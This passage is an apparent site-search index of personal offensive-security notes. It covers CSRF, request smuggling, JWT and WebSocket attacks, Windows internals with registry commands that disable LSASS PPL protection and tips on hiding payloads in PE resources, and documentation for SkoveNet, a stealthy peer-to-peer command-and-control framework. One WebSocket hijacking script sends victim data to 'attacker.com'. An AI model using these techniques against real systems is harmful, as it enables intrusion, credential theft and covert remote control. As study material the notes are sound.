whhhhhy</code></li> <li>another one will add a cookie csrf parameter and compare it with the csrf in post data <code>only when you can edit the victim cookies</code> this know as double submit</li> </ul>"},{"location":"notes/web/CSRF/#samesite-cookies","title":"SameSite cookies","text":"<ul> <li>add new parameter to Cookies <code>SameSite</code> have three options:<ul> <li>Strict: Browsers will not send it in any cross-site requests.</li> <li>Lax: Only GET method, and No background requests.</li> <li>None: Disables SameSite</li> </ul> </li> <li>How to HACK IT: <ul> <li>Lax: <ul> <li>if they accept Get your are good</li> </ul> </li> <li>Strict:<ul> <li>it can be via open redierect</li> <li>Find another vulnz or check the <code>Access-Control-Allow-Origin</code> in respnses  </li> </ul> </li> </ul> </li> <li>You have to find another vicror or tool so you can make thing will effect the behavior of the Cookie mangement system</li> </ul>"},{"location":"notes/web/GraphQL/","title":"GraphQL","text":"<p>so it basiclly a query language to replace RESTfull api the <code>query</code> is like GET request in RESTfull api so it retrive data only  and <code>mutation</code> is wrting data to like POST</p> <ul> <li>see if Introspection is enable so you can retrive data about the schema:</li> </ul> <pre><code>{ \"query\": \"{__schema{queryType{name}}}\" }\n</code></pre> <p>Mybe it is disable you can try this tool: clairvoyance </p> <ul> <li>Suggestions are a feature of the Apollo GraphQL platform.  <p>\"There is no entry for 'productInfo'. Did you mean 'productInformation' instead?).\"</p> </li> </ul> <p>you can use graphql visualizer or Burpsuit (GraphQL -&gt; send to sitemap), inQl </p>"},{"location":"notes/web/HTTP%20request%20smuggling/","title":"HTTP Request Smuggling","text":"<p>CL -&gt; Content-Length TE -&gt; Transfer-Encoding</p> <p>each server will use one header, so here is the three types that could do some damge: - CL.TE  - TE.CL - TE.TE</p> <p>if first and second use CL, there is no way to do smuggling, i mean i don't know how</p> <p>first to know which one we dealing with send that:  <pre><code>Content-Length: 6\nTransfer-Encoding: chunked\n\n3\nabc\nX\n</code></pre></p> <ul> <li>if timeout this means CL.TE cz the frontend send without the X letter and the backend wating 0 </li> <li>if rejected mybe it is TE.CL or TE.TE</li> <li>if respnse this means CL.CL which means no flow here </li> </ul> <pre><code>Content-Length: 6\nTransfer-Encoding: chunked\n\n0\n\nX\n</code></pre> <ul> <li>if socket poison \"XGET not allowed method...\"  CL.TL</li> <li>if timeout this is TE.CL cz the backend server waiting the 6 byte </li> <li>if response maybe this is CL.CL or TE.TE </li> </ul> <p>i don't know a way to bypass CL.CL, but TE.TE There are potentially endless ways to obfuscate the <code>Transfer-Encoding</code> header. For example: <pre><code>Transfer-Encoding: xchunked\n\nTransfer-Encoding : chunked\n\nTransfer-Encoding: chunked\nTransfer-Encoding: x\n\nTransfer-Encoding:[tab]chunked\n[space]Transfer-Encoding: chunked\n\nX: X[\\n]Transfer-Encoding: chunked\n\nTransfer-Encoding\n: chunked\n</code></pre></p>"},{"location":"notes/web/JWT/","title":"JWT","text":"<ul> <li>Now think out of the box </li> </ul> <p>JSON Web Token used in auth. it could be:-</p>"},{"location":"notes/web/JWT/#json-web-signature","title":"JSON Web Signature","text":"<p>it is readable cz it encode, And conatain 3 parts:- - Header: Specifies the encryption algorithms. - Payload: Contains the Data. - Signature: Verifies the integrity of the data.</p>"},{"location":"notes/web/JWT/#json-web-encryption","title":"JSON Web Encryption","text":"<p>it isn't readable cz it enctypt, And conatain 5 parts:- - Protected Header: Specifies the encryption algorithms. - Encrypted Key: Contains the key used to encrypt the content. - Initialization Vector (IV): Ensures unique encryption. - Ciphertext: The encrypted content or payload. - Authentication Tag: Verifies the integrity of the data.</p> <p>There is others                                                                                                                                    :)</p>"},{"location":"notes/web/JWT/#hacking","title":"Hacking","text":"<ul> <li>no checks like using jwt.decode() direct </li> <li>can use alg:none or alg:NonE</li> <li>the key could be cracked?</li> <li> <p>there is some header's parameters can be accepted by the server like</p> <ul> <li> <p><code>jwk</code> (JSON Web Key) - Provides an embedded JSON object representing the key.</p> <ul> <li>Try to encrypt the token using rsa private key and pass the public key here</li> </ul> </li> <li> <p><code>jku</code> (JSON Web Key Set URL) - Provides a URL from which servers can fetch a set of keys containing the correct key.</p> <ul> <li>the same thing you can make extended file 'keys' contain rsa public key then encode it using the private key</li> </ul> </li> <li> <p><code>kid</code> (Key ID) - Provides an ID that servers can use to identify the correct key.</p> <ul> <li>Try path traversal cz some time it grep from system file and could be stored so try sqli </li> </ul> </li> </ul> </li> <li> </li> </ul>"},{"location":"notes/web/JWT/#jwt-algorithm-confusion","title":"JWT algorithm confusion","text":"<p><pre><code>function verify(token, secretOrPublicKey){\n    algorithm = token.getAlgHeader();\n    if(algorithm == \"RS256\"){}\n    else if (algorithm == \"HS256\"){}\n}\n\npublicKey = &lt;public-key-of-server&gt;;\ntoken = request.getCookie(\"session\");\nverify(token, publicKey);\n</code></pre> - you can try to use the publick key as secret key and switch alg from <code>RS256</code> to <code>HS256</code>  - if you do not have a public key you can try to forge it using tools like  <code>jwt_forgery.py</code> or <code>docker run --rm -it portswigger/sig2n &lt;token1&gt; &lt;token2&gt;</code> </p>"},{"location":"notes/web/Logic-flaws/","title":"Logic Flaws","text":"<ul> <li>First you do not have to think out of box before understanding the program and use all functions so you can have a big picture (i mean make the process to the end)</li> <li>LOOK AT EVERY REQUEST!</li> <li>try to delete parameters, overflow, differant request Method, differant datatype or even  block the request (if it a js chack)</li> <li>start again </li> </ul>"},{"location":"notes/web/Race%20Condition/","title":"Race Condition","text":"<p>it all about make them go checking for thing and you will change that thing after they checking it and ofcourse before the job done </p> <p>in php may be the back end server only handle one of the same cookie requests at time. so create another login session before exploit it.</p> <p>more in my writeup \"TCP OverClocking\" </p>"},{"location":"notes/web/WebSocket/","title":"WebSocket","text":"<p>ping pong  this is simple protocol to make long sessions. chat program or gaming stuff  But the handshake maybe vulnarable to [[skove/skoving/notes/web/CSRF]] attack</p> <p>so i can dump and make every thing you can do.</p> <p>here is my server: <pre><code>&lt;script&gt;\n    var ws = new WebSocket('wss://vulnarable.com');\n\n    ws.onopen = function() {\n        ws.send(\"READY\");\n    };\n\n    ws.onmessage = function(event) {\n        fetch('http://attacker.com', {\n        method: 'POST', mode: 'no-cors', body: event.data});\n    };\n&lt;/script&gt;\n</code></pre></p> <p>And it can be vuln to other vulnz like ==SQLi, XSS, ..etc==</p>"},{"location":"notes/windows%20internals/DLL/","title":"DLL","text":"<p>Windows often loads specific DLLs at the same virtual address across all processes to optimize memory and performance.</p> <p>DLL Entry Point: (<code>DllMain</code>) 1. DLL_PROCESS_ATTACH: Triggered when a process loads the DLL. 2. DLL_THREAD_ATTACH: Triggered when a process creates a new thread. 3. DLL_THREAD_DETACH: Triggered when a thread exits normally. 4. DLL_PROCESS_DETACH: Triggered when a process unloads the DLL.</p> <p>Exporting: To make a function available to other programs, use the <code>extern</code> and <code>__declspec(dllexport)</code> keywords.</p> <p>Dynamic Linking: Loading and linking code at runtime rather than compile time. This process involves four main steps:</p> <ol> <li>LoadLibrary() -&gt; Loads the DLL into the process address space if not already present.</li> <li>GetModuleHandle() -&gt; Retrieves a handle to a DLL that is already loaded.</li> <li>GetProcAddress() -&gt; Retrieves the memory address of a specific exported function.</li> <li>type-casting -&gt; Converts the address into a function pointer to execute the code.</li> </ol>"},{"location":"notes/windows%20internals/PE%20structure/","title":"PE Structure","text":"<p>The standard data structure for Windows executables (<code>.exe</code>, <code>.dll</code>, <code>.sys</code>).</p> <ol> <li> <p>DOS Header (<code>IMAGE_DOS_HEADER</code>)</p> <ol> <li>starts at 0x00 and its magic is <code>MZ</code></li> <li>Field <code>e_lfanew</code> points to where the NT Headers start (the PE header location).</li> </ol> </li> <li> <p>DOS Stub (legacy message like \u201cThis program cannot be run in DOS mode\u201d)</p> </li> <li>NT Headers (<code>IMAGE_NT_HEADERS</code>)<ul> <li>Signature: <code>\"PE\\0\\0\"</code></li> <li>File Header (COFF header) <code>IMAGE_FILE_HEADER</code><ul> <li>Machine (x86 or x64)</li> <li>NumberOfSections</li> <li>Characteristics (flags: DLL, executable, etc.)</li> </ul> </li> <li>Optional Header (important for executables)<ul> <li>Magic: PE32 vs PE32+ (32-bit vs 64-bit)</li> <li>AddressOfEntryPoint (RVA of where execution starts)</li> <li>ImageBase (preferred load base)</li> <li>SectionAlignment (memory alignment) / FileAlignment (on-disk alignment)</li> <li>SizeOfImage, SizeOfHeaders</li> <li>Subsystem (GUI / Console)</li> <li>DataDirectories (pointers to important tables)<ul> <li>An array of 16 structures pointing to important tables.</li> <li>Import Table: Lists functions the file needs from other DLLs.</li> <li>Export Table: Functions the file provides to others (common in DLLs).</li> <li>Resource Table</li> <li>Base Relocation Table</li> <li>TLS Table</li> <li>Debug Directory</li> </ul> </li> </ul> </li> </ul> </li> <li>Section Table (array of section headers)<ol> <li>Each section has an <code>IMAGE_SECTION_HEADER</code> entry:<ul> <li>Name (e.g., <code>.text</code>, <code>.data</code>)</li> <li>VirtualAddress (RVA) (where it maps in memory)</li> <li>VirtualSize</li> <li>PointerToRawData (file offset)</li> <li>SizeOfRawData</li> <li>Characteristics (R/W/X permissions)</li> </ul> </li> </ol> </li> <li>Sections<ul> <li><code>.text</code>: RX by default, which is great.</li> <li><code>.data</code>: initialized writable globals (often RW-)</li> <li><code>.rdata</code>: read-only constants/strings (often R--)</li> <li><code>.rsrc</code>: resources (icons, dialogs, version info) so it good with big payload. </li> <li>... </li> </ul> </li> </ol> <p>Store payload as a resource blob inside <code>.rsrc</code>, retrieve it at runtime as (address + size), and copy it to writable memory if you need to modify it. To create the <code>.rsrc</code> section directly (without IDE tools), define the payload in a resource script (<code>.rc</code>), compile it into a resource object (<code>.res</code> / <code>.o</code>), then link it with the main object during PE compilation.</p>"},{"location":"notes/windows%20internals/process/","title":"Processes","text":"<p>PEB: Process Environment Block refers to the structure in memory that holds information about a specific user-mode process. see it with command &gt; !peb</p> <p>TCB: Thread Control Block is a field inside <code>ETHREAD</code> called <code>Tcb</code>, and it is of type <code>KTHREAD</code>. PCB: Process Control Block is a theoretical term referring to all the kernel-level information of a process. In Windows, it maps to the entire <code>EPROCESS</code> structure.</p> <p>_EPROCESS     |_KPROCES     |ThreadListHead         | _ETHREAD          | _ETHREAD             |_KTHREAD</p> <p></p>"},{"location":"notes/windows%20internals/process/#ppl","title":"PPL","text":"<p>PPL: A kernel security feature that blocks memory reads/injection into sensitive processes like lsass.exe. Even admin-level tools can't access PPL processes without a bypass.</p> <pre><code>!process 0 0 [name]\ndt nt!\\_EPROCESS [addr] Protection\n</code></pre> <p>to see if the lsass.exe is PPL:  <pre><code>reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\"\n</code></pre></p> <p>Only specific processes are marked as PPL at launch.  to turn it off or on from spesfic process: <pre><code>reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v RunAsPPL /t REG_DWORD /d 0 /f\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v RunAsPPL /t REG_DWORD /d 0 /f\n</code></pre></p> <p>\ud83d\udd39PPL Runtime bypass: PPLKiller</p>"},{"location":"notes/windows%20internals/process/#createprocess-flow","title":"createprocess flow","text":"<p><code>CreateProcessInternalW</code> in <code>kernel32.dll</code> is called first. It validates arguments like <code>lpApplicationName</code>, <code>lpCommandLine</code>, and <code>dwCreationFlags</code> (e.g., <code>CREATE_SUSPENDED</code>, <code>CREATE_NEW_CONSOLE</code>). It resolves the EXE path (adds <code>.exe</code> if missing) using <code>BasepSearchPath</code>, and prepares internal structs like <code>STARTUPINFO</code> and <code>UNICODE_STRING</code>. (stage 1)</p> <p>It opens the file with <code>NtOpenFile</code>, reads the PE headers, and checks <code>IMAGE_OPTIONAL_HEADER.Subsystem</code> to decide if it's a GUI or console app. It also runs AppCompat logic (shims) if needed. (stage 2)</p> <p>Next, it calls <code>RtlCreateUserProcess</code> in <code>ntdll.dll</code>, which wraps the syscall <code>NtCreateUserProcess</code>. That hands execution into kernel mode. (stage 3)</p> <p>Inside the kernel, <code>NtCreateUserProcess</code> calls <code>PspAllocateProcess</code> to create the <code>EPROCESS</code> and <code>PspAllocateThread</code> for the initial <code>ETHREAD</code>. It maps the executable image using <code>MmCreateSection</code> and <code>MmMapViewOfSection</code>. (stage 4)</p> <p>The system sets up the user-mode address space: base image, stack, TEB, and PEB. The entry point is set to <code>LdrInitializeThunk</code>, which will run user-mode loader logic later. (stage 4 continued)</p> <p>If the process is a GUI app, it connects to <code>csrss.exe</code> using <code>CsrClientConnectToServer</code>, and initializes the LPC channel. If it's a console app, a console is created or inherited using <code>BasepCreateConsole</code>. (stage 5)</p> <p>The kernel finishes setting up the thread: <code>KeInitThread</code> initializes <code>KTHREAD</code>, and <code>PspInsertThread</code> links it to the scheduler. Thread context is set to start at <code>RtlUserThreadStart</code>. (stage 6)</p> <p>If not created suspended, <code>NtResumeThread</code> is called, and execution starts at the entry point defined in the PE header. The loader runs, main() starts, and the parent process is notified. (stage 7)</p>"},{"location":"notes/windows%20internals/security/","title":"Security","text":"<p>Access Checks - Performed by SRM via <code>SeAccessCheck</code> using: thread token (SIDs, privs), requested access mask, object security descriptor.   - Triggered on open by name (<code>ObpCreateHandle</code> \u2192 <code>ObpGrantAccess</code> \u2192 <code>ObCheckObjectAccess</code>) or handle reuse (<code>ObReferenceObjectByHandle</code>).   - Objects with default security store SD in header (method = <code>SeDefaultObjectMethod</code>). Others (e.g., files) use custom method (NTFS driver).   - Rule: request only the access you need \u2014 broad masks (<code>PROCESS_ALL_ACCESS</code>) fail more often and are risky if leaked to other threads.    </p> <p>Security Identifiers (SIDs) - Unique numeric IDs for principals (users, groups, machines, services). Format: <code>S-Rev-Auth-SubAuth...-RID</code>. - Well-known SIDs: same on all systems (e.g., Everyone = <code>S-1-1-0</code>, Network = <code>S-1-5-2</code>, Admin = RID 500). - Machine SID issued at OS install \u2192 local accounts = MachineSID + RID. - Domain SID issued at DC promotion \u2192 domain accounts = DomainSID + RID. - Logon SIDs: <code>S-1-5-5-X-Y</code>, unique per interactive session; used in ACEs to allow session-lifetime access.    </p> <p>Virtual Service Accounts - Format: <code>NT SERVICE\\&lt;ServiceName&gt;</code> \u2192 unique SID per service. - Auto password management, no group membership, appear in ACLs like normal accounts. - Isolation benefit over shared built-ins (LocalService, NetworkService).</p> <p>Security Descriptors (SDs) &amp; Access Control</p> <ul> <li>SD fields: Owner SID, Group SID, DACL (who has access), SACL (who is audited), plus revision &amp; flags.</li> <li>DACL = ordered ACEs (allow/deny, optional object GUIDs for AD, callback types for AuthZ).<ul> <li>Null DACL = full access to everyone.</li> <li>Empty DACL = no access.</li> </ul> </li> <li>SACL = audit ACEs (log success/failure for operations).</li> <li>Inheritance: ACE flags define propagation to children (dirs, registry keys).</li> <li>Stored in object header (if using default security) or custom by subsystem (e.g., NTFS).</li> </ul>"},{"location":"notes/windows%20internals/memory/memory%20mapping/","title":"Memory Mapping","text":"<p>page_table is an array for each process that convert from Virtual Memory to physical Memory. windows will fill this table with values starts with 0.</p> <p>when you call <code>CreateFileMapping()</code> windows will add a new node in [[skove/notes/windows arch/windows internals notes/memory/memory mapping#Virtual Address Descriptor|VAD]] that contains starting[[skove/notes/windows arch/windows internals notes/memory/memory mapping#Virtual Page Number|VPN]], endingVPN and the filepath if this is points to file on disk.</p> <p>When CPU try to convert Virtual Memory and find the value starts with 0 (means didn't used yet) it send interupt <code>page fault</code>. </p> <p>Windows will execute <code>KiPageFault()</code> that take this virtual address and seach in the VAD so if that inside the range of our node will ask the disk driver to copy the <code>node.filepath</code> to the physical address, then windows will write this physical address inside the page_table in the virtual address index. </p> <p>windows will let the process to continue processing.</p> <p>CreateFileMapping() doesn't allocate physical RAM immediately. It creates a Section Object in kernel space and adds a node to the process's VAD Tree.</p> <p>If hFile = INVALID_HANDLE_VALUE, the VAD node points to the Paging File instead of a specific disk file.</p>"},{"location":"notes/windows%20internals/memory/memory%20mapping/#soft-link","title":"Soft Link","text":"<p>you can create mapping but this time from RAM to RAM like soft link. it good when multiple process use the same DLL. also for sharing memory between process. just use <code>CreateFileMapping()</code> with <code>INVALID_HANDLE_VALUE</code>.  </p>"},{"location":"notes/windows%20internals/memory/memory%20mapping/#virtual-page-number","title":"Virtual Page Number","text":"<p>virtual address and physical address point to only one Byte, but page points to 4096 Byte in one page so to find a address you need to get the page then inside this page move another steps to reach your value, we call that steps offset </p>"},{"location":"notes/windows%20internals/memory/memory%20mapping/#virtual-address-descriptor","title":"Virtual Address Descriptor","text":"<p>it is a binary tree and the database of the memory in kernal.   </p>"},{"location":"projects/skovenet/","title":"Welcome to SkoveNet","text":"<p>SkoveNet is a fully decentralized peer-to-peer (P2P) Command &amp; Control (C2) system designed to eliminate the single point of failure inherent in traditional C2 architectures.</p> <p>Unlike conventional systems that rely on a central server or specific domain, SkoveNet operates as a resilient, self-healing mesh network.</p>"},{"location":"projects/skovenet/#the-core-philosophy","title":"The Core Philosophy","text":"<p>No server. No domain. No single point of failure.</p> <p>Traditional C2 systems work like a classic army: one central command relays orders to agents. If that command center (IP, domain, or server) is taken down, the entire network goes blind.</p> <p>SkoveNet inverts this model. The \"server\" is abstract\u2014it is simply whoever possesses the cryptographic secret key. Commands can be injected from any node in the network and will propagate to the intended target(s).</p>"},{"location":"projects/skovenet/#key-features","title":"Key Features","text":"<ul> <li>Fully Decentralized: A P2P mesh graph where every node is equal.</li> <li>Stealthy: Max 5 neighbors per agent ensures a tiny network traffic footprint.</li> <li>Self-Healing: The network automatically re-routes and recovers if nodes go offline.</li> <li>Secure:<ul> <li>Cryptographic Identity: All commands are signed with Ed25519 keys.</li> <li>End-to-End Encryption: All traffic is encrypted using the Noise protocol.</li> </ul> </li> <li>Resilient: Zero dependencies, single binary deployment for Windows, Linux, macOS, and ARM.</li> </ul>"},{"location":"projects/skovenet/#why-skovenet","title":"Why SkoveNet?","text":"Feature Traditional C2 SkoveNet Central Server? Yes Never Takedown Risk High (Block 1 IP) Impossible (Must block all nodes) Operator Location Fixed / Proxy Anywhere (Any node can be operator) Network Structure Hub-and-Spoke Mesh Graph Traffic Pattern Beaconing to Server Low-volume P2P Gossip"},{"location":"projects/skovenet/#getting-started","title":"Getting Started","text":"<p>Ready to dive in?</p> <ul> <li>Check out the Installation Guide to build SkoveNet.</li> <li>Read the Quick Start to run your first mesh.</li> <li>Explore the Architecture to understand how it works under the hood.</li> </ul>"},{"location":"projects/skovenet/troubleshooting/","title":"Troubleshooting","text":"<p>Common issues and solutions for SkoveNet operators.</p>"},{"location":"projects/skovenet/troubleshooting/#connectivity-issues","title":"Connectivity Issues","text":""},{"location":"projects/skovenet/troubleshooting/#no-peers-connected","title":"\"No peers connected\"","text":"<ul> <li>Cause 1: You are running a single node. Start at least one more.</li> <li>Cause 2: Firewalls blocking the port. SkoveNet listens on a random high port by default.<ul> <li>Fix: Check <code>iptables</code> or Windows Firewall.</li> </ul> </li> <li>Cause 3: Different networks. mDNS only works on local LAN.<ul> <li>Fix: Use a Bootstrap node or ensure multicast is allowed between subnets.</li> </ul> </li> </ul>"},{"location":"projects/skovenet/troubleshooting/#command-timed-out","title":"\"Command timed out\"","text":"<ul> <li>Cause: The target node is unreachable or the mesh is partitioned.</li> <li>Fix: Check <code>radar</code> to see if the node is visible. Wait for the mesh to heal (reconnect).</li> </ul>"},{"location":"projects/skovenet/troubleshooting/#build-errors","title":"Build Errors","text":""},{"location":"projects/skovenet/troubleshooting/#undefined-reference-or-gomod-errors","title":"\"undefined reference\" or \"go.mod\" errors","text":"<ul> <li>Fix: Run <code>go mod tidy</code> to ensure all dependencies are downloaded.</li> <li>Fix: Ensure you have Go 1.25.4+.</li> </ul>"},{"location":"projects/skovenet/troubleshooting/#access-denied-on-windows","title":"\"Access Denied\" on Windows","text":"<ul> <li>Cause: Anti-Virus might be flagging the binary.</li> <li>Fix: Add an exclusion for the build directory or the binary.</li> </ul>"},{"location":"projects/skovenet/troubleshooting/#logging","title":"Logging","text":"<p>To debug, run the agent in a terminal and watch the standard output. *   Look for <code>Host created...</code> logs. *   Look for <code>[+] Peer connected</code> events.</p> <p>If the binary exits immediately, check for permission errors or port conflicts.</p>"},{"location":"projects/skovenet/architecture/networking/","title":"Networking &amp; Protocol","text":"<p>SkoveNet leverages the libp2p stack to provide a robust, modular networking layer.</p>"},{"location":"projects/skovenet/architecture/networking/#the-transport-layer","title":"The Transport Layer","text":"<p>The system supports multiple transports to ensure connectivity in various environments:</p> <ul> <li>TCP: Standard reliable transport.</li> <li>WebSockets: Useful for bypassing some firewalls that allow HTTP/S traffic.</li> <li>WebRTC (Planned/Partial): For direct browser-to-node communication and superior NAT hole punching.</li> </ul>"},{"location":"projects/skovenet/architecture/networking/#encryption-security","title":"Encryption &amp; Security","text":"<p>All connections are automatically encrypted using the Noise Protocol Framework. *   Handshake: Nodes perform a handshake to establish a shared secret. *   Authentication: Peer IDs are cryptographically derived from their public keys, preventing identity spoofing.</p>"},{"location":"projects/skovenet/architecture/networking/#routing-logic","title":"Routing Logic","text":"<p>How does a command from Node A reach specific Node Z if they aren't directly connected?</p>"},{"location":"projects/skovenet/architecture/networking/#flood-routing-current","title":"Flood Routing (Current)","text":"<p>Currently, SkoveNet uses a controlled flood (gossip) mechanism for message delivery.</p> <ol> <li>Origin: Node A creates a message with <code>Target=Z</code> and <code>TTL=10</code>.</li> <li>Propagation: A sends it to all connected peers (B, C).</li> <li>Forwarding: B receives it.<ul> <li>Checks if it has seen this Message ID before (deduplication).</li> <li>Decrements TTL.</li> <li>Forwards to its peers (D, E).</li> </ul> </li> <li>Delivery: Eventually, the message reaches Z, or the TTL expires.</li> </ol>"},{"location":"projects/skovenet/architecture/networking/#gossipsub-planned","title":"GossipSub (Planned)","text":"<p>For larger scale, we plan to migrate to GossipSub, a more efficient pubsub router that uses mesh maintenance strategies to reduce bandwidth usage while ensuring high delivery reliability.</p>"},{"location":"projects/skovenet/architecture/networking/#nat-traversal","title":"NAT Traversal","text":"<p>One of the biggest challenges in P2P is connectivity behind NATs (Network Address Translation). SkoveNet uses:</p> <ol> <li>UPnP / NAT-PMP: Attempts to automatically map ports on the router.</li> <li>AutoNAT: Nodes ask peers \"What is my public IP?\" to determine reachability.</li> <li>Hole Punching: Techniques to open direct lines between two nodes behind NATs without a relay.</li> </ol>"},{"location":"projects/skovenet/architecture/overview/","title":"System Architecture","text":"<p>SkoveNet is designed as a pure peer-to-peer system. This section outlines the high-level components and data flow.</p>"},{"location":"projects/skovenet/architecture/overview/#high-level-diagram","title":"High-Level Diagram","text":"<pre><code>graph TD\n    A[Agent A] &lt;--&gt; B[Agent B]\n    B &lt;--&gt; C[Agent C]\n    C &lt;--&gt; D[Agent D]\n    A &lt;--&gt; E[Agent E]\n    D &lt;--&gt; E\n\n    style A fill:#f9f,stroke:#333,stroke-width:2px\n    style B fill:#bbf,stroke:#333,stroke-width:2px\n    style C fill:#bbf,stroke:#333,stroke-width:2px\n    style D fill:#bbf,stroke:#333,stroke-width:2px\n    style E fill:#f9f,stroke:#333,stroke-width:2px\n</code></pre> <ul> <li>Agents (Nodes): Every participant in the network is equal. There are no special \"servers\" or \"clients\".</li> <li>Mesh Network: Nodes connect to a limited number of peers (max 5) to form a resilient graph.</li> </ul>"},{"location":"projects/skovenet/architecture/overview/#system-components","title":"System Components","text":""},{"location":"projects/skovenet/architecture/overview/#1-node-pkgnode","title":"1. Node (<code>pkg/node</code>)","text":"<p>The core struct that initializes the p2p host. It manages: *   Identity: Ed25519 keypair generation and storage. *   Transport: Configuring TCP, WebSocket, and other transports. *   NAT: Handling UPnP and NAT-PMP port mapping.</p>"},{"location":"projects/skovenet/architecture/overview/#2-peer-manager-pkgnodepeer_managergo","title":"2. Peer Manager (<code>pkg/node/peer_manager.go</code>)","text":"<p>Responsible for maintaining a healthy connection count. *   Limit: Enforces a strict maximum of 5 peers. *   Logic: Rejects incoming connections if full; drops old connections if necessary (depending on strategy). *   Purpose: Keeps the network traffic footprint small and hard to detect.</p>"},{"location":"projects/skovenet/architecture/overview/#3-discovery-pkgdiscovery","title":"3. Discovery (<code>pkg/discovery</code>)","text":"<p>How nodes find each other. *   mDNS: Multicast DNS for finding peers on the same LAN (zero-config). *   DHT (Planned): Kademlia DHT for finding peers across the internet without central trackers.</p>"},{"location":"projects/skovenet/architecture/overview/#4-protocol-pkgprotocol","title":"4. Protocol (<code>pkg/protocol</code>)","text":"<p>Defines the wire format for messages. SkoveNet uses a custom binary or JSON-based protocol over libp2p streams. *   ID: <code>/mesh-c2/1.0.0</code> *   Payloads: Wrapped in envelope structures with routing metadata (TTL, Source, Target).</p>"},{"location":"projects/skovenet/architecture/overview/#5-command-execution-pkgcommand","title":"5. Command Execution (<code>pkg/command</code>)","text":"<p>Safely executes instructions received from the network. *   Executes shell commands. *   Captures <code>stdout</code> and <code>stderr</code>. *   Returns the result as a response message to the original sender.</p>"},{"location":"projects/skovenet/architecture/security/","title":"Security Architecture","text":"<p>Security is paramount in SkoveNet. This document outlines the security model, cryptographic primitives, and threat mitigations.</p>"},{"location":"projects/skovenet/architecture/security/#cryptographic-identity","title":"Cryptographic Identity","text":"<p>Every node in the network is identified by an Ed25519 public key. *   Key Generation: Upon first startup, a node generates a random Ed25519 keypair. *   Peer ID: The Peer ID is derived from the public key, ensuring that a node cannot spoof another's ID without the private key.</p>"},{"location":"projects/skovenet/architecture/security/#transport-encryption","title":"Transport Encryption","text":"<p>All P2P communications are encrypted in transit using the Noise Protocol Framework. *   Protocol: <code>Nodes</code> use the <code>Noise</code> handshake (often <code>XX</code> pattern) to establish a secure, authenticated channel. *   Properties:     *   Confidentiality: No eavesdropper can read the command traffic.     *   Integrity: Messages cannot be tampered with in transit.     *   Authenticity: You are guaranteed to be talking to the Peer ID you expect.</p>"},{"location":"projects/skovenet/architecture/security/#command-signing-authorization-operator-mode","title":"Command Signing &amp; Authorization (Operator Mode)","text":"<p>To prevent unauthorized users from issuing commands to the mesh, SkoveNet implements an Operator model.</p> <ul> <li>Operator Key: A special, secret Ed25519 key held only by the operator.</li> <li>Signing: When the operator issues a command via the <code>sign</code> feature in the controller, the command payload is cryptographically signed.</li> <li>Verification: Receiving nodes verify the signature against the hardcoded/distributed Operator Public Key. If the signature is invalid, the command is dropped.</li> </ul>"},{"location":"projects/skovenet/architecture/security/#using-the-sign-command","title":"Using the Sign Command","text":"<pre><code># Sign in with a raw private key string\nsign &lt;private_key_string&gt;\n\n# Or load from a file\nsign -path /path/to/secret.key\n</code></pre>"},{"location":"projects/skovenet/architecture/security/#threat-model","title":"Threat Model","text":"Threat Mitigation Eavesdropping End-to-end encryption (Noise Protocol). Spoofing (Sybil) Ed25519 identities make it impossible to spoof specific IDs. Command Injection Unsigned commands are rejected by agents (when strictly configured). Replay Attacks Messages include a timestamp/nonce to prevent replaying old commands. Traffic Analysis (Future) Pluggable transports (obfuscated traffic) to look like HTTPS/DNS."},{"location":"projects/skovenet/development/contributing/","title":"Contributing to SkoveNet","text":"<p>We welcome contributions! SkoveNet is written in Go and aims for high code quality and minimal dependencies.</p>"},{"location":"projects/skovenet/development/contributing/#project-structure","title":"Project Structure","text":"<pre><code>skovenet/\n\u251c\u2500\u2500 cmd/            # Entry points (main.go)\n\u2502   \u251c\u2500\u2500 agent/      # The agent binary\n\u2502   \u2514\u2500\u2500 controller/ # The operator CLI\n\u251c\u2500\u2500 pkg/            # Library code\n\u2502   \u251c\u2500\u2500 node/       # P2P node logic &amp; peer management\n\u2502   \u251c\u2500\u2500 protocol/   # Message definitions\n\u2502   \u251c\u2500\u2500 discovery/  # mDNS / DHT logic\n\u2502   \u2514\u2500\u2500 command/    # Interaction handlers\n\u251c\u2500\u2500 static/         # Web assets (graph UI)\n\u2514\u2500\u2500 bin/            # Compiled binaries\n</code></pre>"},{"location":"projects/skovenet/development/contributing/#development-guidelines","title":"Development Guidelines","text":"<ol> <li>Language: Go 1.25+</li> <li>Formatting: Always run <code>go fmt ./...</code> before committing.</li> <li>Linting: Use <code>golangci-lint</code> to check for issues.</li> <li>Concurrency: Use <code>sync.Mutex</code> or channels for thread safety. This is critical in P2P code.</li> <li>Dependencies: Keep external dependencies to a minimum. Use the standard library where possible.</li> </ol>"},{"location":"projects/skovenet/development/contributing/#testing","title":"Testing","text":"<ul> <li>Unit Tests: Run <code>go test ./...</code></li> <li>Local Mesh: Manually run 2-3 agents in separate terminals to verify connectivity and command propagation.</li> </ul>"},{"location":"projects/skovenet/development/roadmap/","title":"Roadmap","text":"<p>Our vision is to make SkoveNet the most resilient C2 framework in existence.</p>"},{"location":"projects/skovenet/development/roadmap/#phase-1-mvp-completed","title":"Phase 1: MVP (Completed)","text":"<ul> <li> Functional P2P mesh (libp2p).</li> <li> Basic command propagation and execution.</li> <li> mDNS local discovery.</li> <li> Multi-platform support (Windows/Linux).</li> <li> Basic interactive controller.</li> </ul>"},{"location":"projects/skovenet/development/roadmap/#phase-2-security-resilience-in-progress","title":"Phase 2: Security &amp; Resilience (In Progress)","text":"<ul> <li> Command Signing: Enforce Ed25519 signatures on all critical operations.</li> <li> GossipSub: Migrate from flood routing to GossipSub for scalability.</li> <li> Traffic Obfuscation: Hide P2P patterns to evade NIDS.</li> <li> Key Rotation: Mechanism to revoke and rotate operator keys.</li> </ul>"},{"location":"projects/skovenet/development/roadmap/#phase-3-advanced-features-planned","title":"Phase 3: Advanced Features (Planned)","text":"<ul> <li> File Transfer: P2P file uploads/downloads.</li> <li> Reverse Shell: Streaming interactive shells over the mesh.</li> <li> Module System: Loadable plugins for agents.</li> <li> Web UI: Fully featured React/Vue dashboard for the controller.</li> <li> Mobile Support: potentially running agents on Android/iOS.</li> </ul>"},{"location":"projects/skovenet/features/commands/","title":"Commands &amp; Execution","text":"<p>The SkoveNet Controller provides a powerful CLI for interacting with the 